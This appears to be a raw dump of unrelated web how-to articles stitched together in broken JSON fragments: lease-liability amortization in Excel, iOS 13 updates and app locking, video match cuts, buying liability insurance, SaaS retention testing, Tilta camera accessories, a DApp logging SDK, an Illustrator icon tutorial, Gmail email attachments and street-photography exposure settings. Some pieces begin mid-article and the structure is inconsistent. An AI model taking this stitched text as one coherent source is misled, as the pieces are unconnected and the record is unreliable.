      "text": "Previously, we covered how to calculate the present value of lease payments using Excel spreadsheets . In this article, we will demonstrate how to calculate the present value of your lease payments as well as prepare the liability amortization schedule for the lease liability in the same step, using Excel. \nThis information is important for all companies, not just for companies that plan on continuing to use Excel spreadsheets for lease accounting. Even if you plan to use lease accounting software for compliance with the new standard , you can use the information in this blog to ensure that your chosen software provider is performing this calculation accurately. Transitioning from ASC 840 to ASC 842 can be difficult, but there are resources that can help you gain an understanding of the methods laid out below for our calculations. \nWhat is the lease liability? \nThe lease liability is defined as the present value of your future lease payments. This is calculated as the initial step in accounting for a lease under FASB ASC 842 , and this amount is then used to calculate the ROU (right-of-use) asset , that is recorded in addition to the liability for operating leases and capital leases . \nA lessee\u2019s obligation to make the lease payments arising from a lease , measured on a discounted basis. \nHow to create the lease amortization schedule and calculate your lease liability \nDownload our free present value calculator to follow along: \nHere are the steps to follow to calculate the present value of lease payments and the lease liability amortization schedule using Excel when the payment amounts are different, starting with an example: \nCalculate the present value of lease payments for a 10-year lease with annual payments of $1,000 with 5% escalations annually, paid in advance. Assume the rate inherent in the lease is 6%. \nStep 1: Create an Excel spreadsheet with these five columns \nCreate a new Excel spreadsheet and title five columns with the following headers: Period, Cash, Expense, Liability Reduction, and Liability Balance, as shown below: \nStep 2: Enter number periods and cash payments \nEnter the number periods starting from 0 to 9, and enter the cash payments in each period. Because payments are made in advance, the first payment of $1,000 is made in period 0. The annual payments then escalate at a 5% rate. Please see illustration below: \nStep 3: Enter the expense formula \nEnter \u201c0\u201d for expense in period 0 (because payments are made in advance). In expense for period 1, enter the cell for the period 0 liability balance and multiply by 6%. See below. \nStep 4: Fill the expense column \nCopy the formula for expense in period 1 down for the remaining expense columns. \nStep 5: Enter the formula for liability reduction \nThe formula for each liability reduction image is the corresponding cash minus the corresponding expense. See below. \nCopy the formula down the entire liability reduction column. \nStep 6: Enter the formula for liability balance \nEnter \u201c0\u201d for the liability balance in the line above period 0. In liability balance for period 0, enter the cell for the above cell\u2019s liability balance minus the liability reduction in period 0. What you will end up with is the previous liability balance, reduced by the current liability reduction (see below). \nStep 7: Fill the remaining liability balance column \nCopy the formula for liability in period 0 down for the remaining liability balance columns. \nStep 8: Perform \u201cWhat-If Analysis\u201d on the liability balance \nSelect the liability balance for period 9. In the top bar in Excel, go to the \u201cData\u201d tab, then the \u201cWhat-if Analysis\u201d Tab, then select \u201cGoal Seek.\u201d \nStep 9: Set liability balance value to 0 by using goal seek \nIn the dialog box that follows, make sure the \u201cSet cell\u201d is set to the cell representing the liability balance for period 9, in the \u201cTo Value\u201d enter 0, and in the \u201cBy Changing Cell\u201d enter the cell representing the liability balance for the period above period 0. See below. \nStep 10: Click \u201cOK\u201d \nAfter you click ok, Excel will prepare your amortization schedule for you automatically. See below. \nBased on this, the present value of a 10-year lease with payments of $1,000 annually, 5% escalations, and a rate inherent in the lease of 6% is $9,586. \nSummary \nThis schedule will help you make your journal entries for the entire life of the lease, if you\u2019re using Excel. If you\u2019re using a lease accounting software, the information above will help you cross-check the calculations performed by your provider so you can ensure accuracy.",

So, if you have an older device please stop wasting your time and do not look for any tricks. Apple is clever and has already changed some changes according to hardware detection. \nAdvertisement \nThings to do before installing iOS 13 \nYou must prepare your iPhone or iPad for the iOS or iPadOS 13 updates.

But, there are some tips for you which you should follow. Apple has already launched the iOS 13 final version. \nIn this guide, I am sharing the iTunes method which required a computer and also the OTA method to install iOS without a computer. \nHow to Install iOS 13 OTA Update \nThe very known method is that of OTA update method. Users usually prefer this method on the release day. Because there is hype over the internet and everyone is waiting to see iOS 13 on their device. If you are one of those then you are the right place. \nAgain, you should follow this method, only if you have a complete backup of your device. If you do not have a complete backup of your device then do not proceed.

      "text": "Filmmaker Daniel DeArco is back with the promised Part 2 of his tutorial on creating cool and compelling \u201cmatch cuts\u201d to up your transition game. In Part 1 , he showed you how he captured the three shots that he would be using to create the match cut; in Part 2, he takes us the rest of the way there in post. \nThe clip that DeArco is creating in this video is this short transition made up of three different shots: \nAs he was putting together this two-part tutorial, DeArco realized that the key shot he\u2019s using isn\u2019t exactly \u201cbeginner-friendly\u201d given the amount of work it takes to capture and splice together these three shots. So in this video, he starts out by putting together a very simple, easy-to-shoot and easy-to-edit match cut using a roll of tape and a bowl of fruit. \nThen, once he\u2019s done creating that clip, he dives back into the original three-clip sequence and brings you along as he edits that one together into the more complex final product. \nIf you want to follow along with any of this\u2014be it the beginner-friendly \u201cwarmup\u201d or the more complex key shot\u2014 check out the video\u2019s description on YouTube where you can download all of the clips involved and follow along in Premiere Pro for yourself. \nAnd if you want to see more from DeArco, \u201csmash that subscribe button\u201d while you\u2019re there.",

      "text": "Here is a quick method to lock apps on your iPhone running iOS 13 without Jailbreak. This method is 100% working and tested on iPhone and iPadOS 13 running on your iPad. \nAnother day, another amazing tutorial for all the iOS 13 and iPadOS 13 users. Apple users always wanted to lock an application on their iPhone. Still, Apple hasn\u2019t added any genuine way to do this but added a very smart feature to lock applications on the iPhone or iPad. Today, I am going to show, how you can lock applications without Jailbreak. Also, we are not going to download any third application. \nWith iOS 12, Apple added Screen Time feature to protect and lock applications. This is much helpful when you want your device away from kids. For example, if your child is addicted to YouTube and always looking for a video then you can set a passcode timer on application. However, this feature is available on a parent and child device. With the help of iCloud, you can manage applications and set the timer on all devices. \nAdvertisement \nSo, if you are one who wants to lock apps on your iPhone especially Photos App then this tutorial is for you. But, before proceeding next keep in mind, applications locked with the timer will stop sending notifications once locked. Do this, if you are okay with this. \nHow to Lock Applications with Screen Time Feature \nAt the very first, Go to Settings > Screen Time on your iPhone or iPad. You need to turn it on when you are using it first time. \nHit Use Screen Time Passcode and Choose a 4 Digit Passcode to set on your apps. \nChoose applications at once by selecting the first option or select apps manually. Set minimum time to 0 hours and 1 min for a kind of more security. \nYou have added a passcode timer to your favorite applications. Just keep in mind, there is no way to lock applications intermediately. \nFinally, Open Locked application and hit Ask for More Time bottom of the screen. \nYou can\u2019t change the time limit message on the screen, but you can still protect applications from friends and family members. After entering the passcode, either choose Enter Screen Time Passcode or ask for One more Minute (timer you set for the day). Finally, enter the passcode and access application. \nYou can ignore some applications if you want them to use anywhere, anytime just go to Settings > Screen Time > Always allowed screen and they will not be included in this feature. \nAlso, you can apply the settings at once across all of your iPhone and iPad if you are using the same iCloud ID on all devices. Moreover, if you have different devices and want different settings then you will find your devices under Settings > Screen Time > Top Right Corner. That\u2019s it. \nI hope you have learned something new today. If you have any questions in your mind please ask them in the comment box below. Also, if you have liked this tutorial share your valuable comments. ",

      "text": "Thinking of applying for liability insurance for your business online? Congratulations, you have come to the right place! We will take you through each step of the process, so you know exactly what to expect when you apply online. \n1 \u2013 Find the Right Policy for You \nInsurance is never a one-size-fits-all deal. You need to find the right policy for you. Searching for professional liability insurance online will help you find a couple of sites offering protection for your business. Take a look at what they cover with their policies and also have a look at their reviews, both on and off the website. \nMake sure that you are covered by any policies that might affect you in the future. Also, make sure that you understand all the terms and conditions listed in the procedures above. You also need to maintain a good reputation with your clients and new customers so that they can see you as a reliable insurance provider. \nSee if you can find an unbiased source somewhere which will allow you to see what people honestly think about the insurance provider. Insurance might seem complicated, but if you understand how it works, you might be tempted to get the right one for you. \nPublic views on insurance are biased, so make sure that you go to the right person when you want to get the right coverage for you and your family. \nAlso, read up on the policies of the \ninsurance company \nbefore contacting an agent to buy insurance. \n2 \u2013 Get a Quote \nWhen you have found some sites, you like the look of, apply for quotes to see how much it would cost you. Quotes should usually be free to receive and without obligation; this means that you should be able to walk away from the deal if you don't like what is offered. \nBe wary of any company which does not provide these, and there may be more to their policies than meets the eye. Do some research before buying the right insurance. \nAlso, find some local friends and families that have relatives or friends that are working in the insurance company and ask them for some advice. It is even better if they have first-hand information as this is rather crucial if you want to get the right insurance for yourself. \nThis also means that you will not fall into any pitfalls or loopholes of any insurance policy that you are not familiar with. Ask around, do some research, then after that, you can consult a friend that has bought a similar insurance policy before. \n3 \u2013 Check the Details \nWhen you receive your quote, it should have come with some essential details. The first thing you should look at is the level of coverage. This is what the insurance protects you from and can change depending on the size of the policy and what the insurance is for. \nSecondly, you should look at how much you can claim if you needed to. \nThirdly, you should look at the deductible; this is how much money you need to pay towards whatever cost you need the insurance for before the insurance company will provide the rest. \nFinally, you should look at the premium. This is the amount of money you pay either monthly or annually to ensure that you are fully covered. Make sure that you get the right details when you view your quote and also make sure that everything is spelled out in black and white so that you won't regret after you receive your quote. \nIf you have further questions, make sure that you ask your agent before making the final say. Also, make sure that this insurance agent is honest and not trying to drown you into future payments. \n4 \u2013 Buy the Insurance \nThis is the natural part. Fill out the online forms like you would for any online purchase. Just remember to use your business details instead of your ones! \n5 \u2013 Check Your Documents \nWhen your policy has been purchased, you will shortly receive an email with all the insurance documents attached. You may also be able to opt to have them mailed to you by post. \nThese documents should include the start and end date of your policy and the details which we mentioned above. \nYou should also have a period in which you can query anything if there is a change to the system which you did not want when you purchased it. Make sure that everything is filled in correctly to avoid any complications as once the documents have been signed, and there is no turning back. \nMake a copy of these relevant documents so that you have a copy for reference when you want to make a claim or statement if something turns up. \nMake sure you file these documents carefully on your computer as you will need access to them if you ever make a claim. Most insurance companies also have some form of customer portal where you will be able to see your documents whenever you log on. \nApart from that, make sure that you don't lose contact with the insurance agent's contact information. \nAnother thing to bear in mind is to save the documents on online storage like Google Drive so that you can download it if you lose the materials due to a computer failure. \nWhy Do We Need To Have A Personal Liability Insurance? \nPeople that have lots of assets will try to buy personal liability insurance policies. This coverage is for anyone that has lots of assets, and they have their home policies. This insurance is made for people that have a higher risk of getting sued, such as landlords. \nThis type of insurance occurs on the property of the policyholder, but only to a specific limit. If someone sues the homeowners beyond that limit, that will be the end. There is also an umbrella insurance policy where the insurance pays on the policyholder's behalf when there is property damage due to libel or vandalism. \nThe system also covers any damage that occurs in holiday homes and recreational vehicles or other properties the owner used for rental. Although this insurance policy is not for everyone, most people have a reduced rate for the packages that they want to sign up for. \nThere are certain limitations in personal liability insurance, which might need the policyholder to incur extra expenses. \nThere we have it! Everything you need to know when applying for a liability insurance policy online. Search now and find the perfect system for you and your business. Make sure you ask around for more information if you want to get the right policy for yourself. Be cautious, and do not sign up for liability insurance before you know what you are headed into and beware of any scams. \nGet Instant Online QuoteSearching for \nprofessional liability insurance online \nwill help you find a couple of sites offering protection for your business. Take a look at what they cover with their policies and also have a look at their reviews, both on and off the website.",

      "title": "How to A/B Test SaaS Onboarding and Optimize Retention",
      "text": "We spend money on getting people to our website, visitors spend eight seconds on the page and 98% will never return. \nBoy, that hurts. \nIt is especially painful for SaaS businesses because of their lengthy sales funnels and high acquisition costs. \nA while ago our marketing team at Linkody decided to gather data on how to attract visitors, move them down the marketing funnel and make sure they love using our tool. What we found out was extremely valuable for us and every SaaS business out there. \nBut before we get into the details, let\u2019s go through what retention rate optimization is and how data can be helpful in improving it. \nWhat is retention rate optimization? \nRetention rate optimization is the process of improving the rate of customers returning to use your services. \nIt sounds like something you should be doing, right? \nIn numbers it looks like this: \nAccording to a study from Unbounce , only 4% of your website\u2019s visitors will \u201cconvert\u201d \u2014 i.e., do whatever you want them to do. In Linkody\u2019s case, it\u2019s 8% of everyone who takes the free trial. So, if we want eight people to try our free trial, we have to get 100 to land on our page. \nThe retention rates of different industries are hard to predict, but, in our case, we are generally able to keep these eight people for a month. Afterward, this will happen: 4 to 5 people will unsubscribe. But 3 to 4 will try our paid plans, from which only 1 to 2 subscribers will keep paying for more than a month. \nThis means that only one or two people out of 100 will keep paying to use our services. Naturally, improving this number is a big priority for us. \nThis is where retention rate optimization comes in, trying to boost your profit on every potential customer who lands on your page. \nNow it\u2019s time to explain the path we took. \nBehavior analysis \nFirst of all, you need to understand your customers\u2019 behavior: \nWhy did they leave after trying the free trial? \nWhy did they leave after trying the paid plans? \nThe best way to test your assumptions is simply by talking to your customers via emails, calls, live chats or Skype calls. Anything will do. \nOne low-key method that Linkody\u2019s marketing team tends to use is Hotjar\u2019s Poll. To set it up , you simply implement a small code snippet \u2014 similar to setting up Google Analytics \u2014 and set up the question sequence. \nIt looks like this: the question is triggered a few seconds after you visit a page. \nAsk simple, open-ended questions and soon you will have a lot more insight into why your customers do what they do. \nGet ready to monitor data \nGoogle Analytics won\u2019t cut it in delivering insights into customer behavior you need. You will need a funnel and event data monitoring software to help to visualize your events. \nIn this situation, Kissmetrics is the perfect tool for this job. \nSetting Kissmetrics up is a bit more technical than setting up Google Analytics as you have to assign tracking to every event you want to monitor. Follow these instructions to set up Kissmetrics successfully. \nNow, what\u2019s great about behavior analytics\u2019 tools is that they offer easy-to-schedule demo calls, in case there is something you struggle to understand. \nOnce everything is set, let\u2019s see how we can use this data to improve your retention. \nUnderstanding the funnel report is the first step towards understanding why and when people move from one step to another. It gives you a person-based data that lets you identify people and actions they take. Furthermore, you can see the last interaction of a potential customer who left your site without signing up. \nYou could use this data to improve your email campaigns or as a basis for a proactive approach. A simple chat with these people could help you understand why they decided to take their business elsewhere. \nTo get the most out of your report, check out the different segments of data that are collected by Kissmetrics. You can choose a property to get an overview of specific data like the referrer site to understand which parts of your campaigns work in favor of your retention rates. \nYou can create custom properties like webinar names to really grasp what is working for your specific business. Customize Kissmetrics to your own specific campaigns to fully understand what can be improved. \nImproving the onboarding process \nIn our case, users who test different features of our tool can be retained for longer than those people who haven\u2019t tried such tasks. \nDesigning user onboarding shouldn\u2019t be left to gut feeling. Instead, make sure to tailor it to the features your users find the most useful. \nOnce you can track events and see the impact your onboarding has on user retention, you can then form a set of assumptions. These assumptions should then be tested to see if iterating your onboarding can improve your retention rate. \nRetention rate analysis \nFor example, we discovered that people who used a key feature of our tool have a retention rate of 20.1%. \nThis key feature was also the first step of our onboarding. \nThe second step for our customers was to connect our tool to Google Analytics. As it turned out, people who did add Analytics features stayed active users of Linkody for an average of 12 days, with a retention rate of 7.69%. \nIn comparison, users skipping this step have a 1.65% retention rate. \nWe kept exploring the actions people took using our tool. Interestingly, people who used the disavow feature of our tool were much more likely to return \u2014 this cohort\u2019s retention rate for 12 days was stunning 10.2%. \nWe had a 24% retention rate increase just by suggesting a few spammy backlinks to disavow. \nIf you spot such discrepancies in your users\u2019 behavior, I can only advise you to challenge your existing onboarding with A/B tests. \nFrom a free trial to a paid plan \nOnce you\u2019ve identified key retention actions, you can comprehend which actions are worth pursuing. \nFor example, ProdPad gamified their 14-day free trial by giving extra \u201cfree days\u201d for each action people performed on the page. \nThis makes sense. \nGiving free days away will not help you to sell your product if your users don\u2019t use the features that are relevant to them. \nYou can take this one step further and investigate which actions increase the chance of people switching from free trials to paid plans. \nHave a look at the data on activities that improve conversion rates between steps in your funnel. In this case, it is about customers moving from free to paid plans. \nWe discovered that people who linked Google Analytics to our service were 32.5% more likely to use paid plans, compared to those who didn\u2019t link. \nThis is what we found using the same correlation for the cohort that used our disavow tool: \nThe disavow tool is seemingly so crucial to our retention rate that it more than doubles the conversion rate from free to paid plans. \nOnce you start seeing this kind of data, it\u2019s time to test to approve or disapprove your assumptions. \nImprove your marketing funnel \nThere are many ways to test your assumptions. \nFor example, you could involve your team, adjust your onboarding and gamify your free trial. \nOr\u2026 you could use Facebook ads. \nSetting up Facebook for retargeting ads \nFacebook offers amazing retargeting capabilities, allowing you to target any specific action that a specific group of people took. \nFirst, clearly lay out the actions people can take on your site. Once you know the impact these actions have on retention you can make sure people use your tool to its full capability. \nWhat\u2019s more, I will show you how to display ads after almost any event taking place while people use your tool. \nFirst, let\u2019s start by setting up the tracking. We will need to implement two things: \nA Facebook pixel \u2014 here \u2019s the guide that will walk you through it. \nEvent tracking \u2014 here are the codes to implement for facilitating event tracking. \nCreating audiences \nOnce that\u2019s done, you need to define the specific audiences that you wish to target. \nEvery event that occurs on your site is tracked by Facebook\u2019s pixel and people who fall into specific categories can be shown specific ads. \nWe know our highest retention rate came from people who had used the disavow tool. Moreover, we know there were quite a few people who didn\u2019t do that. \nTo start, head over to Facebook\u2019s business manager, (1) then to Ads Manager (2), and finally, click on Audiences (3). \nThere you will be able to create cohorts or \u201ccustom audiences\u201d (1). Next, create a custom audience based on \u201cwebsite traffic\u201d. \nThen you will have to define the event. In this case, we want to target people (1) who visited in the last 30 days (2) Our \u201cdashboard\u201d (3). Specifically, the ones who didn\u2019t use (4) the \u201c disavow \u201d tool (6) in this period of time. \nMake sure to exclude the other groups of people. There is no need to show ads to people who have already done what you will be asking them to do. \nShowing ads for the right audience \nNow you can reach out to this cohort. \nShow your customers the benefits of performing a particular action. Teach them what this feature can do for their business. \nThese people have most probably not grasped exactly how useful your tool or service is \u2014 the exact reason why others love it so much. \nA great way to educate people about this is with video guides or blog posts. Film a walk-through or write a how-to guide describing the benefits of taking this action. \nThen head over (1) to the Ads Manager (2) and create an ad of your choosing. \nNext, select the ad\u2019s objective: I suggest choosing between traffic (1), engagement (2), or conversions (3). \nThen, all you have to do is select the custom audience you created before. \nDone! \nNow all you have to do is check if your retention rates are improving. \nThis will help you to quickly prove or disprove the assumptions you made before. \nGo ahead and optimize your retention rates \nThis guide can help you to get the best return out of the money you\u2019ve already put down. So why not go ahead and test it to see if you, too, can boost your profits. \nOne thing to note is that this is just one test. In most cases, retention optimization will be an ongoing process. \nThe post How to A/B Test SaaS Onboarding and Optimize Retention appeared first on Mention .",

      "text": "Tilta\u2019s new Matte Box and Follow Focus combo make a killer rig for under $200 \nDecember 18, 2019 by John Aldred Leave a Comment \nCamera cage & accessories manufacturer Tilta has announced the new MB-T15 Mini Matte Box and FF-T06 Mini Follow Focus units for low budget shooters. Designed to help you turn your DSLR or mirrorless camera into a more useful cinema and video rig, the two new items both cost less than $100 each. \nTilta MB-T15 Mini Matte Box \nThe Tilta MB-T15 Mini Matte Box only offers shade protection from the top, rather than all four sides, but that\u2019s probably what\u2019s \u201cMini\u201d about it. What it does do, though, is allow you to stack screw-on filters behind it, as it mounts directly to your lens using the filter thread, as well as use industry-standard 4\u00d75.65\u2033 filters in front. \nMatte boxes are traditionally very expensive pieces of kit if you want a decent one. There are a few cheap ones out there , but given Tilta\u2019s prior products, I would imagine this is much more solid than those available at similar prices. \nAs this fits to your lens filters, the standard package includes adapters with 67mm, 72mm, 77mm and 82mm threads. Optionally, you can pick up adapters which cover 52mm, 55mm, 58mm, 62mm and 85mm filter threads as well. \nThe Tilta MB-T15 Mini Matte Box is available to pre-order now for $84.15 before December 20th , after which it\u2019ll go up to its regular retail price of $99. \nTilta FF-T06 Mini Follow Focus \nA good follow focus unit is also something which has traditionally cost a fair amount of money . The R&D to develop a follow focus with zero-backlash and a nice smooth action is not inexpensive. But such units have been out for a number of years now, and this isn\u2019t Tilta\u2019s first rodeo . Again, there are a lot of cheap ones out there, but given Tilta\u2019s reputation for producing solid kit, I would imagine this will beat out much if not all of the similarly priced competition. \nIt weighs only 220g (7.7oz) and bolts onto any standard 15mm rail system and is adjustable to fit just about any diameter of cinema or photo lens. It offers 360-degree rotation with adjustable hard stops (handy for those using photo lenses that just spin and spin when you hit minimum focus distance or infinity). \nInside the kit, you get the Mini Follow Focus unit itself, a Zip Tie follow focus ring, a 15mm single rod attachment, two allen keys and a portable case. A variety of focus gear attachments are available for lenses with different pitch gears. \nThe Tilta FF-T06 Mini Follow Focus is available to pre-order now for $84.15 before December 20th , after which it\u2019ll go up to its regular retail price of $99. \nBoth of these items look quite interesting, and I\u2019m curious to see how well they live up to expectations given their low cost. I think that matte box is definitely going to have to go on my shopping list when they hit the UK.",

      "title": "Logs and Analytics for your DApp from Any Provider",
      "text": "Logs and Analytics for your DApp from Any Provider \nIf you are a dApp developer then you probably know retrieving dApp specific logging and infrastructure analytics is one of the most important parts of the development process, but can also be the most painstaking. Especially when there are several sources of providers you may use including different network endpoints and wallet providers. Today we\u2019ll walk through how to use Terminal Logs , a Terminal product for aggregating logs from any RPC endpoint or wallet provider of your choice. \nHere\u2019s what your dApp can do with Terminal Logs: \n- Surface logs for any RPC endpoint such as Infura \n- Surface logs from any injected web3 wallet providers such as MetaMask \n- Introduce cloud logging into your Truffle development environment \n- Compatible with web3.js and ethers.js \n- Filter logs by type, source, timestamp, and others \nFirst we\u2019ll go through how to wrap your web3 provider to surface logs from any static RPC endpoint and then show how to retrieve logs from any web3 injected endpoint. While wrapping your HTTP provider is fairly simple if you already have a working dApp, we thought it would be helpful to demonstrate actually surfacing the logs with some examples. Specifically, we\u2019ll show how to easily get logs from Infura and Metamask directly onto your Terminal account or command line. \nInfura or Other RPC endpoints \nIn your Javascript project, wherever you initialize your Web3 provider, it probably looks something like this: \nIn order to surface logs from an RPC endpoint, you will have to have web3 and Terminal SDK installed as well as a Terminal account and API key. To install copy the following into your command line. To make and account and generate and API key check out the website here . \nnpm install @terminal-packages/sdk \nnpm install web3 \nOnce you have everything installed, you can send the logs to your Terminal Account by simply initializing your endpoint as follows: \nIf you want to add specific options for your web3 provider such as timeout, headers or withCredentials, simply add them in at the end of your web3 object like this: \nNow we\u2019ll dive into an example of actually retrieving these logs from a real project. For this walk through, we wrote two simple dApps to show Terminal logging in action. \nFor the first example we used an Infura RPC endpoint. To illustrate logging from an Infura endpoint we created a simple script to check the balance of any Ethereum address. \nIn order to run this code yourself, you will have to make a Terminal account and retrieve your API key and then make an Infura account and grab a new RPC endpoint. Also feel free to substitute in any address you\u2019d like. \nOnce you\u2019ve done this, you can simply run the script from your command line using node.js. As soon as you run the script, the logs will get pushed to your Terminal Logging Platform and look something like this: \nThe value shown at the top is the web3 call made by our program. To see more information about your logs, you can click on the log you are interested in. \nAll of these logs can also be easily accessed from you command line using the TerminalCLI. For instructions on how to do that check out the Terminal Docs . \nMetaMask and Other Web3 Injected Endpoints \nMany dApps do not use a static RPC endpoints in their code at all since it\u2019s possible to expose all of your application\u2019s functionality alongside the web3 provider injected into your browser by wallets like Metamask. It is important to note that logging from MetaMask is a little bit different from most other injected web3 providers. Because MetaMask is the most widely used, we will begin by showing how to surface logs from there. Logging from MetaMask is as easy as dropping the following code snippet into the <head> tag of your webpage. You do not have to install the Terminal SDK for this. \nNote that your \u2018projectId\u2019 is the ID for the Terminal project associated with the provider endpoint you are logging from. To demonstrate this in a real environment we decided to make a quick dApp that only consists of a few simple buttons. The first button will perform the same function as the example above for Infura, while the others will interact directly with the MetaMask browser extension. MetaMask requires a front-end page to inject itself into so we built the dApp using React, however this is not required to retrieve logs using Terminal and the process for surfacing them is the same in React or any other front-end framework.\u200c \nHere is our basic App.js file designed with a few buttons. The first to retrieve the balance of an address of your choice using the MetaMask injected provider. \u200cThe next button enables metamask browser extension to interact with the current webpage. The extension must be enabled for a page can interact with it. once it is clicked, you will have to reload the page in order to use the other buttons. The next one retrieves the address(es) of the current MetaMask account and the last one asks the user to sign some data using the MetaMask extension. The data being signed is trivial in this case as we do not require that any data actually be signed. Note that to see what these buttons are doing, you will need to open your browser console. In chrome this is usually done either with \u2018F12\u2019, or \u2018ctrl + shift + j\u2019. \nYou can check out the full project on Github . React inherently creates an index.html which defines the <head> tag of your website. Regardless of how you create the front end of your dApp, all you have to do is paste the html script above into your html file like this: \nThe dApp built above will look something like this: \nOnce you have that snippet in your html file, you are all set and the logs will be sent directly to your Terminal Logging Platform as shown below. \nAlthough the injected injected web3 provider might differ based on which wallet a user has installed on their browser, you can still wrap the provider with TerminalSDK and surface logs. This can be extremely useful for developers because it enables you to capture more granular data about which wallets are most common among users of your dApp, what actions users are taking, and more. For other injected web3 providers, simply wrap the initialization of your provider in the following code as in the first example. \nNow that you are receiving logs directly to your Terminal account, you can sort through your logs using an array of different filters or have them sent directly to your command line with TerminalCLI. This makes finding whatever you\u2019re looking for as easy as possible.",

      "text": "Welcome back to another Illustrator based tutorial, in which we\u2019re going to learn how to create a little cassette icon using nothing more than a couple of basic geometric shapes and tools. \nSo, assuming you already have the software running in the background, bring it up and let\u2019s get started! \nTutorial Details: Cassette Tape Icon \nProgram: Adobe Illustrator CS6 \u2013 CC 2019 \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Grid Positioning \nEstimated Completion Time: 20 Minutes \nFinal Image: Cassette Tape Icon \nStep 1 \nAs with every new project, we\u2019re going to kick things off by setting up a New Document , by heading over to File > New (or by using the Control-N keyboard shortcut), which we will then adjust as follows: \nNumber of Artboards: 1 \nWidth: 64 px \nHeight: 64 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web , the only one that you\u2019ll have to manually adjust being the Artboard\u2019s Size ( Width x Height ). \nStep 2 \nAs soon as we\u2019ve finished setting up our project file, we can start working on the actual cassette tape icon, and we will do so by creating the main shape for the background using a 56 x 56 px circle, which we will color using #ff9b64 and then center align to the underlying Artboard using the Align panel\u2019s Horizontal and Vertical Align Center options. \nStep 3 \nAdd the main shape for the cassette using a 30 x 20 px rounded rectangle with a 2 px Corner Radius , which we will color using #FFFFFF and then center align to the larger background. \nStep 4 \nGive the shape an outline using the Stroke method, by creating a copy of it ( Control-C ) which we will paste in front ( Control-F ) and then adjust by first changing its color to #1c202d . Next, we\u2019re going to immediately flip its Fill with its Stroke using the Shift-X keyboard shortcut, making sure to open up the Stroke panel and set its Weight to 2 px afterwards. Once you\u2019re done, select and group the two shapes together using the Control-G keyboard shortcut. \nStep 5 \nCreate the bottom insertion using a 16 x 4 px rectangle ( #1c202d ), which we will adjust by individually selecting its top anchor points using the Direct Selection Tool ( A ) and then pushing them to the inside by a distance of 2 px using the directional arrow keys. Once you\u2019re done, give the resulting shape a 2 px thick outline ( #1c202d ), making sure to group ( Control-G ) and position the two to the center of the larger body\u2019s bottom edge. \nStep 6 \nAdd the main shape for the cassette tape icon\u2019s window using an 18 x 4 px rounded rectangle with a 2 px Corner Radius and a 2 px thick Stroke ( #1c202d ), which we will align to the center of the larger body as seen in the reference image . \nStep 7 \nCreate the supply reels using two 4 x 4 px circles ( #1c202d ) with a 2 px thick outline ( #1c202d ), individually grouping ( Control-G ) and then positioning them onto the sides of the window, so that the outlines overlap. \nStep 8 \nAdd the little screws using four 2 x 2 px circles, which we will color using #1c202d and then position at a distance of 1 px from the cassette tape icon\u2019s corners. \nStep 9 \nFinish off the cassette tape icon and with it the project itself, by adding the side insertions using two 2 x 4 px rounded rectangles ( #1c202d ) with a 1 px Corner Radius , which we will position as seen in the reference image . Take your time, and once you\u2019re done, don\u2019t forget to select and group ( Control-G ) all of the composing shapes together, doing the same for the entire cassette tape icon afterwards. \nAwesome Job! \nAs always, I hope you had fun working on the project and most importantly managed to learn something new and useful during the process. \nThat being said, if you have any questions feel free to post them within the comments section and I\u2019ll get back to you as soon as I can! \nThe post How to Create a Cassette Tape Icon in Adobe Illustrator appeared first on Vectips .",

That\u2019s all changing now\u2014for better or worse, if your friends and loved ones like to blast you with annoying chain messages\u2014as Gmail now lets you attach multiple emails as email attachments to other emails. \nEmailing emails as email attachments might sound confusing (or even superfluous), but it\u2019s incredibly easy to do: \nLog into Gmail on desktop and start a new message. \nClick and drag the emails you wish to attach from your inbox list into the email draft window, like in Google\u2019s animated GIF above. Alternatively, you can also click to highlight a message in your inbox, then click the three-stacked dots icon at the top of the inbox and select \u201cSend as Attachment.\u201d \nAll messages in a thread will be converted to .eml files and clipped to your draft as attachments. If you scroll down to the bottom of the draft, you\u2019ll see them all listed as separate files, and you can rename and delete them like any other Gmail attachments. You can import these files into almost any email client; the recipient doesn\u2019t need to use Gmail in order to read them. \nThe ability to email your emails is still rolling out to users, so if you can\u2019t make this work just yet, you\u2019ll be able to play with it soon. In the meantime, please forward this post to your top five contacts immediately or face seven years of bad luck.",

      "text": "How to optimise your camera settings for street photography to get the best exposure \nOctober 30, 2019 by John Aldred Leave a Comment \nVIDEO \nStreet photography is one of the more chaotic yet fun genres of photography that many people choose to pursue. Even if it\u2019s not something that people do regularly, it\u2019s something that many of us do anyway when we go on vacation as just a regular part of documenting our trip. But how do we optimise our camera for this sort of shooting if we\u2019re used to doing something more controlled, like portraits or product photography? \nIn this video, street photographer Frederik Trovatten talks about how he sets up his camera for shooting street photography. While he\u2019s using the Fuji X-T3, the principles he mentions are common to many DSLR and mirrorless cameras. He also touches on shooting street photography with negative film, too. \nEssentially, Frederik\u2019s advice amounts to aperture priority with auto ISO. This allows you to have control over your depth of field while letting the camera choose the shutter speed and ISO. He does set some rules and limitations as to how far he wants to let the camera adjust things, though. \nIn bright conditions, he sets the minimum shutter speed to 1/250th of a second and the maximum ISO to 1600. The camera will always try to keep the ISO as low as possible, speeding up the shutter speed to reduce exposure on bright scenes. But once 1/250th of a second at the lowest ISO isn\u2019t bright enough, it will bump up the ISO to compensate while making sure that the shutter goes no slower than 1/250th of a second. \nWhile the specifics of exactly how to do this will vary from one camera to the next, most cameras support this kind of a setup. My Nikon DSLRs have allowed it for as long as I can remember, through the Auto ISO settings in the shooting menu. \nIf you\u2019re shooting in darker conditions, or your subjects aren\u2019t moving quite so quickly, you can adjust these settings to your taste and shooting environment, and Frederik offers some suggestions on how to adjust them based on the shooting conditions, as well as how to meter when exposing for scenes of high contrast containing both extreme highlights and shadows. \nFrederick also provides some tips for exposing street photography with film, too. Obviously you can\u2019t go auto ISO when shooting analogue, but you are more easily able to retain the highlights . \nI generally tend to shoot about a 50/50 mix of aperture priority and full manual when I shoot street photography on digital. I don\u2019t go the auto ISO route with either method, though, preferring to keep the ISO exactly where I want it to be, along with the aperture. \nHow do you set up your camera for street photography?",

